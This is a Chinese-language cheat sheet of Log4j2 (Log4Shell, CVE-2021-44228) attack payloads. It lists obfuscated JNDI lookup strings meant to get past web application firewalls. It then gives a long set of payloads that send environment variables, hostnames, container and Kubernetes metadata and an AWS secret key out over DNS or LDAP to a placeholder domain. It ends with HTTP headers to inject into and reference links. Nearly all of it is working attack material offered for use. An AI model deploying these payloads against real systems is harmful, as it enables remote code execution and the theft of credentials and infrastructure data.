## Waf 绕过和数据泄露payloads

```ruby
${jndi:ldap://domain.com/j}
${jndi:ldap:/domain.com/a}
${jndi:dns:/domain.com}
${jndi:dns://domain.com/j}
${${::-j}${::-n}${::-d}${::-i}:${::-r}${::-m}${::-i}://domain.com/j}
${${::-j}ndi:rmi://domain.com/j}
${jndi:rmi://domainldap.com/j}
${${lower:jndi}:${lower:rmi}://domain.com/j}
${${lower:${lower:jndi}}:${lower:rmi}://domain.com/j}
${${lower:j}${lower:n}${lower:d}i:${lower:rmi}://domain.com/j}
${${lower:j}${upper:n}${lower:d}${upper:i}:${lower:r}m${lower:i}}://domain.com/j}
${jndi:${lower:l}${lower:d}a${lower:p}://domain.com}
${${env:NaN:-j}ndi${env:NaN:-:}${env:NaN:-l}dap${env:NaN:-:}//domain.com/a}
jn${env::-}di:
jn${date:}di${date:':'}
j${k8s:k5:-ND}i${sd:k5:-:}
j${main:\k5:-Nd}i${spring:k5:-:}
j${sys:k5:-nD}${lower:i${web:k5:-:}}
j${::-nD}i${::-:}
j${EnV:K5:-nD}i:
j${loWer:Nd}i${uPper::}
```

利用了 UpperLookup 调用字符串的 `toUpperCase` 方法可以将不同 Locale 转为 Unicode Standard 字符的特性，例如将 Turkish 的 ı（\u0131） 经过 `toUpperCase` 转为 I（\u0069）。

> 如果您能 ping 回但它是不可利用的，则以下有效负载可用于数据渗漏。

```shell
${jndi:ldap://${env:user}.domain.com/exp}
${jndi:dns://${hostName}.domain.com/a}
${jndi:dns://${env:COMPUTERNAME}.domain.com/a}
${jndi:dns://${env:USERDOMAIN}.domain.com/a}
${jndi:dns://${env:AWS_SECRET_ACCESS_KEY.domain.com/a}
${jndi:ldap://${ctx:loginId}.domain.com/j}
${jndi:ldap://${map:type}.domain.com/j}
${jndi:ldap://${filename}.domain.com/j}
${jndi:ldap://${date:MM-dd-yyyy}.domain.com/j}
${jndi:ldap://${docker:containerId}.domain.com/j}
${jndi:ldap://${docker:containerName}.domain.com/j}
${jndi:ldap://${docker:imageName}.domain.com/j}
${jndi:ldap://${env:USER}.domain.com/j}
${jndi:ldap://${event:Marker}.domain.com/j}
${jndi:ldap://${mdc:UserId}.domain.com/j}
${jndi:ldap://${java:runtime}.domain.com/j}
${jndi:ldap://${java:vm}.domain.com/j}
${jndi:ldap://${java:os}.domain.com/j}
${jndi:ldap://${jndi:logging/context-name}.domain.com/j}
${jndi:ldap://${hostName}.domain.com/j}
${jndi:ldap://${docker:containerId}.domain.com/j}
${jndi:ldap://${k8s:accountName}.domain.com/j}
${jndi:ldap://${k8s:clusterName}.domain.com/j}
${jndi:ldap://${k8s:containerId}.domain.com/j}
${jndi:ldap://${k8s:containerName}.domain.com/j}
${jndi:ldap://${k8s:host}.domain.com/j}
${jndi:ldap://${k8s:labels.app}.domain.com/j}
${jndi:ldap://${k8s:labels.podTemplateHash}.domain.com/j}
${jndi:ldap://${k8s:masterUrl}.domain.com/j}
${jndi:ldap://${k8s:namespaceId}.domain.com/j}
${jndi:ldap://${k8s:namespaceName}.domain.com/j}
${jndi:ldap://${k8s:podId}.domain.com/j}
${jndi:ldap://${k8s:podIp}.domain.com/j}
${jndi:ldap://${k8s:podName}.domain.com/j}
${jndi:ldap://${k8s:imageId}.domain.com/j}
${jndi:ldap://${k8s:imageName}.domain.com/j}
${jndi:ldap://${log4j:configLocation}.domain.com/j}
${jndi:ldap://${log4j:configParentLocation}.domain.com/j}
${jndi:ldap://${spring:spring.application.name}.domain.com/j}
${jndi:ldap://${main:myString}.domain.com/j}
${jndi:ldap://${main:0}.domain.com/j}
${jndi:ldap://${main:1}.domain.com/j}
${jndi:ldap://${main:2}.domain.com/j}
${jndi:ldap://${main:3}.domain.com/j}
${jndi:ldap://${main:4}.domain.com/j}
${jndi:ldap://${main:bar}.domain.com/j}
${jndi:ldap://${name}.domain.com/j}
${jndi:ldap://${marker}.domain.com/j}
${jndi:ldap://${marker:name}.domain.com/j}
${jndi:ldap://${spring:profiles.active[0].domain.com/j}
${jndi:ldap://${sys:logPath}.domain.com/j}
${jndi:ldap://${web:rootDir}.domain.com/j}
```

> 检查这些标头

```sql
Accept-Charset
Accept-Datetime
Accept-Encoding
Accept-Language
Authorization
Cache-Control
Cf-Connecting_ip
Client-Ip
Contact
Cookie
DNT
Forwarded
Forwarded-For
Forwarded-For-Ip
Forwarded-Proto
From
If-Modified-Since
Max-Forwards
Origin
Originating-Ip
Pragma
Referer
TE
True-Client-IP
True-Client-Ip
Upgrade
User-Agent
Via
Warning
X-ATT-DeviceId
X-Api-Version
X-Att-Deviceid
X-CSRFToken
X-Client-Ip
X-Correlation-ID
X-Csrf-Token
X-Do-Not-Track
X-Foo
X-Foo-Bar
X-Forward-For
X-Forward-Proto
X-Forwarded
X-Forwarded-By
X-Forwarded-For
X-Forwarded-For-Original
X-Forwarded-Host
X-Forwarded-Port
X-Forwarded-Proto
X-Forwarded-Protocol
X-Forwarded-Scheme
X-Forwarded-Server
X-Forwarded-Ssl
X-Forwarder-For
X-Frame-Options
X-From
X-Geoip-Country
X-HTTP-Method-Override
X-Http-Destinationurl
X-Http-Host-Override
X-Http-Method
X-Http-Method-Override
X-Http-Path-Override
X-Https
X-Htx-Agent
X-Hub-Signature
X-If-Unmodified-Since
X-Imbo-Test-Config
X-Insight
X-Ip
X-Ip-Trail
X-Leakix
X-Originating-Ip
X-ProxyUser-Ip
X-Real-Ip
X-Remote-Addr
X-Remote-Ip
X-Request-ID
X-Requested-With
X-UIDH
X-Wap-Profile
X-XSRF-TOKEN
Authorization: Basic 
Authorization: Bearer 
Authorization: Oauth 
Authorization: Token
```

https://mp.weixin.qq.com/s/vAE89A5wKrc-YnvTr0qaNg

https://su18.org/post/log4j2/#rc2-%E5%8F%8A%E6%80%9D%E8%80%83

https://xz.aliyun.com/t/10649#toc-2



里面有一些信息泄露的 ${env},${sys}的https://github.com/jas502n/Log4j2-CVE-2021-44228

waf绕过

https://xie.infoq.cn/article/4cfb262fa1d0f08c182127df4

https://www.redblue.wiki/special-topic/log4j/waf-bypass#1.-xi-tong-huan-jing-bian-liang
